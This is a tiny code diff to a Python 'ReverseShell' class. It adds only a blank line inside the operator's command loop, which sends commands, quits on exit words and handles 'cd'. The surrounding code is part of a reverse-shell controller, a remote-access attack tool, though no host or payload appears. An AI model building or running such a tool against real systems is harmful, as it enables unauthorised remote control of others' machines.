@@ -9,6 +9,7 @@ class ReverseShell:
             server.send_data(command)
             if command == "exit" or command == "stop" or command == "quit" or command == "q":
                 run_shell = False
+                
                 break        
             elif command.startswith("cd"):
                 display_msg("changing path")
